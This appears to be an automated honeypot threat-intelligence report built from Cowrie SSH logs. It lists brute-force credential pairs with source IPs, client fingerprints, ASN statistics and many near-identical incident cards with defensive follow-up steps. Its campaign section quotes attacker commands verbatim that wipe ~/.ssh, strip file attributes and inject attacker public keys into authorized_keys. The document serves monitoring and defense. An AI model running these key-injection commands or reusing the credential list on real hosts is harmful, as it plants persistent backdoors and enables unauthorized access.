| `root` | `123@@@` | `129.153.145.135` | 2026-07-28T07:18:54 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-28T07:19:02 |
| `config` | `77777` | `103.181.81.150` | 2026-07-28T07:22:20 |
| `tmp` | `123456` | `156.240.235.171` | 2026-07-28T07:23:00 |
| `345gs5662d34` | `345gs5662d34` | `156.240.235.171` | 2026-07-28T07:23:04 |
| `tmp` | `3245gs5662d34` | `156.240.235.171` | 2026-07-28T07:23:06 |
| `guest` | `0000000` | `60.18.139.82` | 2026-07-28T07:24:55 |
| `guest` | `0000000` | `117.2.123.19` | 2026-07-28T07:25:03 |
| `config` | `77777` | `194.31.8.12` | 2026-07-28T07:25:49 |
| `config` | `77777` | `208.109.38.143` | 2026-07-28T07:25:56 |
| `root` | `12345678900` | `112.197.2.116` | 2026-07-28T07:25:56 |
| `config` | `77777` | `10.0.0.73` | 2026-07-28T07:26:09 |
| `ubuntu` | `123qwe./` | `103.98.176.164` | 2026-07-28T07:26:29 |
| `345gs5662d34` | `345gs5662d34` | `103.98.176.164` | 2026-07-28T07:26:33 |
| `ubuntu` | `3245gs5662d34` | `103.98.176.164` | 2026-07-28T07:26:35 |
| `guest` | `0000000` | `59.34.17.130` | 2026-07-28T07:28:08 |
| `guest` | `0000000` | `113.140.95.250` | 2026-07-28T07:28:18 |
| `guest` | `0000000` | `10.0.0.73` | 2026-07-28T07:28:31 |
| `centos` | `123654` | `222.86.168.224` | 2026-07-28T07:33:49 |
| `centos` | `123654` | `196.188.93.169` | 2026-07-28T07:37:07 |
| `centos` | `123654` | `65.20.191.231` | 2026-07-28T07:37:20 |
| `nobody` | `111111` | `118.163.145.175` | 2026-07-28T07:46:50 |
| `nobody` | `111111` | `202.138.229.190` | 2026-07-28T07:46:59 |
| `config` | `3` | `106.89.60.3` | 2026-07-28T07:49:21 |
| `nobody` | `111111` | `10.0.0.73` | 2026-07-28T07:50:39 |
| `config` | `3` | `210.4.68.73` | 2026-07-28T07:52:45 |
| `mysql` | `alpine` | `138.219.13.21` | 2026-07-28T07:58:15 |
| `ediuser` | `ediuser` | `103.229.125.106` | 2026-07-28T07:59:23 |
| `345gs5662d34` | `345gs5662d34` | `103.229.125.106` | 2026-07-28T07:59:26 |
| `ediuser` | `3245gs5662d34` | `103.229.125.106` | 2026-07-28T07:59:27 |
| `mysql` | `alpine` | `211.247.127.250` | 2026-07-28T08:01:29 |
| `mysql` | `alpine` | `123.212.9.122` | 2026-07-28T08:01:38 |
| `mysql` | `alpine` | `10.0.0.73` | 2026-07-28T08:01:51 |
| `mysql` | `ubuntu` | `177.135.206.10` | 2026-07-28T08:14:40 |
| `mysql` | `ubuntu` | `50.217.40.11` | 2026-07-28T08:14:47 |
| `default` | `555` | `117.70.94.155` | 2026-07-28T08:17:06 |
| `default` | `555` | `203.192.211.180` | 2026-07-28T08:17:14 |
| `default` | `555` | `10.0.0.73` | 2026-07-28T08:17:24 |
| `test` | `66666` | `220.189.209.18` | 2026-07-28T08:26:11 |
| `test` | `66666` | `196.203.231.220` | 2026-07-28T08:26:18 |
| `root` | `d5SxjA00pQ` | `47.121.138.211` | 2026-07-28T08:30:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `47.250.92.207` | 2026-07-28T08:34:20 |
| `admin` | `7777` | `178.214.160.4` | 2026-07-28T08:38:14 |
| `pi` | `abc123` | `122.176.21.104` | 2026-07-28T08:39:13 |
| `pi` | `abc123` | `65.20.149.239` | 2026-07-28T08:39:25 |
| `pi` | `abc123` | `10.0.0.73` | 2026-07-28T08:39:37 |
| `admin` | `7777` | `200.106.49.149` | 2026-07-28T08:41:39 |
| `operator` | `operator2016` | `200.232.114.71` | 2026-07-28T08:47:13 |
| `operator` | `operator2016` | `200.106.49.149` | 2026-07-28T08:47:21 |
| `operator` | `operator2016` | `169.211.232.182` | 2026-07-28T08:50:30 |
| `operator` | `operator2016` | `122.160.103.228` | 2026-07-28T08:50:43 |
| `operator` | `operator2016` | `10.0.0.73` | 2026-07-28T08:50:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **677** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 308 |
| OpenSSH | 72 |
| libssh | 31 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 276 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 69 | 65 |
| `eff4c24daffc...` | Modern SSH client | 15 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 276 | 2 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 69 | 65 | Mirai/variant |
| `95420f9d932d...` | libssh | 19 | 10 | — |
| `eff4c24daffc...` | Go SSH scanner | 15 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 4 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **11** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.98.176.164`, `156.240.235.171`, `103.229.125.106`, `152.32.212.226`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.s
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **162** |
| Unique ASNs | **99** |
| High-Risk ASNs | **85** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 9 | HIGH |
| `AS48721` | Flyservers S.A. | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS46562` | Performive LLC | 5 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (399)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-340666db1418

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:03` | `cowrie.login.success` |
| `2026-07-28 04:55:05` | `cowrie.session.params` |
| `2026-07-28 04:55:05` | `cowrie.command.input` |
| `2026-07-28 04:55:06` | `cowrie.log.closed` |
| `2026-07-28 04:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2917501332dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:03` | `cowrie.session.connect` |
| `2026-07-28 04:55:04` | `cowrie.client.version` |
| `2026-07-28 04:55:04` | `cowrie.client.kex` |
| `2026-07-28 04:55:08` | `cowrie.login.success` |
| `2026-07-28 04:55:10` | `cowrie.session.params` |
| `2026-07-28 04:55:10` | `cowrie.command.input` |
| `2026-07-28 04:55:10` | `cowrie.log.closed` |
| `2026-07-28 04:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fa551add12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:10` | `cowrie.session.connect` |
| `2026-07-28 04:55:10` | `cowrie.client.version` |
| `2026-07-28 04:55:10` | `cowrie.client.kex` |
| `2026-07-28 04:55:13` | `cowrie.login.success` |
| `2026-07-28 04:55:15` | `cowrie.session.params` |
| `2026-07-28 04:55:15` | `cowrie.command.input` |
| `2026-07-28 04:55:16` | `cowrie.log.closed` |
| `2026-07-28 04:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef7d13d6ff8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:15` | `cowrie.session.connect` |
| `2026-07-28 04:55:15` | `cowrie.client.version` |
| `2026-07-28 04:55:15` | `cowrie.client.kex` |
| `2026-07-28 04:55:18` | `cowrie.login.success` |
| `2026-07-28 04:55:20` | `cowrie.session.params` |
| `2026-07-28 04:55:20` | `cowrie.command.input` |
| `2026-07-28 04:55:21` | `cowrie.log.closed` |
| `2026-07-28 04:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38bc624c296

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:20` | `cowrie.session.connect` |
| `2026-07-28 04:55:21` | `cowrie.client.version` |
| `2026-07-28 04:55:21` | `cowrie.client.kex` |
| `2026-07-28 04:55:23` | `cowrie.login.success` |
| `2026-07-28 04:55:25` | `cowrie.session.params` |
| `2026-07-28 04:55:25` | `cowrie.command.input` |
| `2026-07-28 04:55:26` | `cowrie.log.closed` |
| `2026-07-28 04:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc87b7ccdfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:25` | `cowrie.session.connect` |
| `2026-07-28 04:55:26` | `cowrie.client.version` |
| `2026-07-28 04:55:26` | `cowrie.client.kex` |
| `2026-07-28 04:55:29` | `cowrie.login.success` |
| `2026-07-28 04:55:31` | `cowrie.session.params` |
| `2026-07-28 04:55:31` | `cowrie.command.input` |
| `2026-07-28 04:55:32` | `cowrie.log.closed` |
| `2026-07-28 04:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45866e4928c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:31` | `cowrie.session.connect` |
| `2026-07-28 04:55:32` | `cowrie.client.version` |
| `2026-07-28 04:55:32` | `cowrie.client.kex` |
| `2026-07-28 04:55:34` | `cowrie.login.success` |
| `2026-07-28 04:55:35` | `cowrie.session.params` |
| `2026-07-28 04:55:35` | `cowrie.command.input` |
| `2026-07-28 04:55:36` | `cowrie.log.closed` |
| `2026-07-28 04:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-276df5794f73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:38` | `cowrie.session.connect` |
| `2026-07-28 04:55:38` | `cowrie.client.version` |
| `2026-07-28 04:55:38` | `cowrie.client.kex` |
| `2026-07-28 04:55:39` | `cowrie.login.success` |
| `2026-07-28 04:55:40` | `cowrie.session.params` |
| `2026-07-28 04:55:40` | `cowrie.command.input` |
| `2026-07-28 04:55:41` | `cowrie.log.closed` |
| `2026-07-28 04:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-041d03c134d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:43` | `cowrie.session.connect` |
| `2026-07-28 04:55:43` | `cowrie.client.version` |
| `2026-07-28 04:55:43` | `cowrie.client.kex` |
| `2026-07-28 04:55:44` | `cowrie.login.success` |
| `2026-07-28 04:55:45` | `cowrie.session.params` |
| `2026-07-28 04:55:45` | `cowrie.command.input` |
| `2026-07-28 04:55:45` | `cowrie.log.closed` |
| `2026-07-28 04:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad96b8a25c4

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:46` | `cowrie.session.connect` |
| `2026-07-28 04:55:47` | `cowrie.client.version` |
| `2026-07-28 04:55:47` | `cowrie.client.kex` |
| `2026-07-28 04:55:50` | `cowrie.login.success` |
| `2026-07-28 04:55:51` | `cowrie.direct-tcpip.request` |
| `2026-07-28 04:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8dbfb71fd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:49` | `cowrie.session.connect` |
| `2026-07-28 04:55:49` | `cowrie.client.version` |
| `2026-07-28 04:55:49` | `cowrie.client.kex` |
| `2026-07-28 04:55:50` | `cowrie.login.success` |
| `2026-07-28 04:55:50` | `cowrie.session.params` |
| `2026-07-28 04:55:50` | `cowrie.command.input` |
| `2026-07-28 04:55:51` | `cowrie.log.closed` |
| `2026-07-28 04:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3f95c62db1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:55 |
| **Last Seen** | 2026-07-28 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:55:54` | `cowrie.session.connect` |
| `2026-07-28 04:55:54` | `cowrie.client.version` |
| `2026-07-28 04:55:54` | `cowrie.client.kex` |
| `2026-07-28 04:55:56` | `cowrie.login.success` |
| `2026-07-28 04:55:57` | `cowrie.session.params` |
| `2026-07-28 04:55:57` | `cowrie.command.input` |
| `2026-07-28 04:55:58` | `cowrie.log.closed` |
| `2026-07-28 04:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27275fbbe10

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:00` | `cowrie.session.connect` |
| `2026-07-28 04:56:00` | `cowrie.client.version` |
| `2026-07-28 04:56:00` | `cowrie.client.kex` |
| `2026-07-28 04:56:01` | `cowrie.login.success` |
| `2026-07-28 04:56:02` | `cowrie.session.params` |
| `2026-07-28 04:56:02` | `cowrie.command.input` |
| `2026-07-28 04:56:02` | `cowrie.log.closed` |
| `2026-07-28 04:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eae661e5daa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:06` | `cowrie.session.connect` |
| `2026-07-28 04:56:06` | `cowrie.client.version` |
| `2026-07-28 04:56:06` | `cowrie.client.kex` |
| `2026-07-28 04:56:07` | `cowrie.login.success` |
| `2026-07-28 04:56:08` | `cowrie.session.params` |
| `2026-07-28 04:56:08` | `cowrie.command.input` |
| `2026-07-28 04:56:08` | `cowrie.log.closed` |
| `2026-07-28 04:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a121426254

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:11` | `cowrie.session.connect` |
| `2026-07-28 04:56:11` | `cowrie.client.version` |
| `2026-07-28 04:56:11` | `cowrie.client.kex` |
| `2026-07-28 04:56:12` | `cowrie.login.success` |
| `2026-07-28 04:56:14` | `cowrie.session.params` |
| `2026-07-28 04:56:14` | `cowrie.command.input` |
| `2026-07-28 04:56:14` | `cowrie.log.closed` |
| `2026-07-28 04:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42402122600

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:17` | `cowrie.session.connect` |
| `2026-07-28 04:56:17` | `cowrie.client.version` |
| `2026-07-28 04:56:17` | `cowrie.client.kex` |
| `2026-07-28 04:56:18` | `cowrie.login.success` |
| `2026-07-28 04:56:19` | `cowrie.session.params` |
| `2026-07-28 04:56:19` | `cowrie.command.input` |
| `2026-07-28 04:56:19` | `cowrie.log.closed` |
| `2026-07-28 04:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8227110d914

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:24` | `cowrie.session.connect` |
| `2026-07-28 04:56:24` | `cowrie.client.version` |
| `2026-07-28 04:56:24` | `cowrie.client.kex` |
| `2026-07-28 04:56:24` | `cowrie.login.success` |
| `2026-07-28 04:56:25` | `cowrie.session.params` |
| `2026-07-28 04:56:25` | `cowrie.command.input` |
| `2026-07-28 04:56:25` | `cowrie.log.closed` |
| `2026-07-28 04:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a7be93333d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:29` | `cowrie.session.connect` |
| `2026-07-28 04:56:29` | `cowrie.client.version` |
| `2026-07-28 04:56:29` | `cowrie.client.kex` |
| `2026-07-28 04:56:30` | `cowrie.login.success` |
| `2026-07-28 04:56:31` | `cowrie.session.params` |
| `2026-07-28 04:56:31` | `cowrie.command.input` |
| `2026-07-28 04:56:31` | `cowrie.log.closed` |
| `2026-07-28 04:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

